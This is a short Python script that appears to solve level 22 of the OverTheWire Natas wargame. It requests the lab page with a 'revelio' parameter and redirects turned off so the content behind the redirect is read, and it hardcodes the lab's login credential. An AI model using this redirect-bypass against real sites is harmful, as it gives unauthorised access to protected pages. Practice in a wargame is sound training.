import requests

r = requests.get(
    "http://natas22.natas.labs.overthewire.org/",
    auth=("natas22", "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"),
    params={"revelio": ""},
    allow_redirects=False,  # pwn
)

print(r.content.decode())
